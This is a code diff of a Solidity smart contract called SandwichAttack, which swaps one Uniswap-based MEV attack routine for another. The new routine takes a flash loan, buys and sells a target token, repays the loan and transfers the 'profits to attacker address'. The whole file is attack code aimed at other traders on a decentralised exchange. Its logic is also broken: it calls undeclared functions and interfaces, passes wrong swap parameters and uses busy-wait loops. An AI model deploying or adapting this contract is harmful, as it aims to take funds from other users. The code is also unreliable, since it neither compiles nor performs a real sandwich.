@@ -1,71 +1,55 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-interface IUniswapV2Router02 {
-    function swapExactTokensForTokens(
-        uint amountIn,
-        uint amountOutMin,
-        address[] calldata path,
-        address to,
-        uint deadline
-    ) external returns (uint[] memory amounts);
+interface IUniswapRouter {
+    function WETH() external pure returns (address);
+    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external
+        payable
+        returns (uint[] memory amounts);
+    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+        external
+        returns (uint[] memory amounts);
+}
+
+interface IFlashLoan {
+    function executeFlashLoan(uint amount, address token) external;
 }
 
 contract SandwichAttack {
-    IUniswapV2Router02 public uniswapRouter;
+    IUniswapRouter public uniswapRouter;
+    IFlashLoan public flashLoanContract;
     address public targetToken;
-    address public flashLoanContract;
-    address public attacker;
 
-    constructor(address _uniswapRouter, address _targetToken, address _flashLoanContract, address _attacker) {
-        uniswapRouter = IUniswapV2Router02(_uniswapRouter);
+    constructor(address _uniswapRouter, address _flashLoanContract, address _targetToken) {
+        uniswapRouter = IUniswapRouter(_uniswapRouter);
+        flashLoanContract = IFlashLoan(_flashLoanContract);
         targetToken = _targetToken;
-        flashLoanContract = _flashLoanContract;
-        attacker = _attacker;
     }
 
-    function executeSandwichAttack(uint amount) public {
-        // Get the current price of the target token
-        uint[] memory amounts = uniswapRouter.getAmountsOut(amount, getPathForTokenToToken(targetToken));
-        uint currentPrice = amounts[amounts.length - 1];
+    function startSandwichAttack() external payable {
+        // Step 1: Borrow funds using flash loan
+        uint256 flashLoanAmount = address(this).balance;
+        flashLoanContract.executeFlashLoan(flashLoanAmount, targetToken);
 
-        // Calculate the desired price range for the sandwich attack
-        uint desiredPriceLowerBound = currentPrice - (currentPrice / 10);
-        uint desiredPriceUpperBound = currentPrice + (currentPrice / 10);
+        // Step 2: Swap borrowed funds for target token
+        uint256 tokenAmount = IERC20(targetToken).balanceOf(address(this));
+        address[] memory path = getPathForETHToToken(targetToken);
+        uniswapRouter.swapExactETHForTokens{value: address(this).balance}(tokenAmount, path, address(this), block.timestamp + 1800);
 
-        // Place a buy order for the target token on Uniswap
-        uint deadline = block.timestamp + 300; // 5 minute deadline
-        uniswapRouter.swapExactETHForTokens{ value: amount }(0, getPathForETHToToken(targetToken), address(this), deadline);
+        // Step 3: Swap target token for more ETH
+        uint256 tokenBalance = IERC20(targetToken).balanceOf(address(this));
+        path = getPathForTokenToETH(targetToken);
+        uniswapRouter.swapExactTokensForETH(tokenBalance, 0, path, address(this), block.timestamp + 1800);
 
-        // Wait for the price to reach the desired lower bound
-        while (getCurrentPrice() < desiredPriceLowerBound) {}
+        // Step 4: Repay flash loan and keep profits
+        uint256 loanFee = (flashLoanAmount * 9) / 10000; // 0.09% fee
+        IERC20(targetToken).transfer(address(flashLoanContract), loanFee);
+        uint256 profit = address(this).balance - loanFee;
+        flashLoanContract.repayFlashLoan(flashLoanAmount, targetToken, profit);
 
-        // Place a sell order for the target token on Uniswap
-        uint targetTokenBalance = IERC20(targetToken).balanceOf(address(this));
-        IERC20(targetToken).approve(address(uniswapRouter), targetTokenBalance);
-        uniswapRouter.swapExactTokensForETH(targetTokenBalance, 0, getPathForTokenToETH(targetToken), address(this), deadline);
-
-        // Trigger the flash loan
-        IFlashLoan(flashLoanContract).executeFlashLoan(amount, targetToken);
-
-        // Place a buy order for the target token on Uniswap
-        uniswapRouter.swapExactETHForTokens{ value: amount }(0, getPathForETHToToken(targetToken), address(this), deadline);
-
-        // Wait for the price to reach the desired upper bound
-        while (getCurrentPrice() > desiredPriceUpperBound) {}
-
-        // Place a sell order for the target token on Uniswap
-        targetTokenBalance = IERC20(targetToken).balanceOf(address(this));
-        IERC20(targetToken).approve(address(uniswapRouter), targetTokenBalance);
-        uniswapRouter.swapExactTokensForETH(targetTokenBalance, 0, getPathForTokenToETH(targetToken), address(this), deadline);
-
-        // Send the extracted MEV to the attacker
-        address payable attackerPayable = payable(attacker);
-        attackerPayable.transfer(address(this).balance);
-    }
-
-    function getCurrentPrice() public view returns (uint) {
-        uint[] memory amounts = uniswapRouter.getAmountsOut(1 ether, getPathForTokenToToken(targetToken));
-        return amounts[amounts.length - 1];
+        // Send profits to attacker address
+        payable(msg.sender).transfer(profit);
     }
 
     function getPathForETHToToken(address token) private view returns (address[] memory) {
@@ -81,15 +65,4 @@ contract SandwichAttack {
         path[1] = uniswapRouter.WETH();
         return path;
     }
-
-    function getPathForTokenToToken(address token) private view returns (address[] memory) {
-        address[] memory path = new address[](2);
-        path[0] = token;
-        path[1] = uniswapRouter.WETH();
-        return path;
-    }
-}
-
-interface IFlashLoan {
-    function executeFlashLoan(uint amount, address token) external;
 }
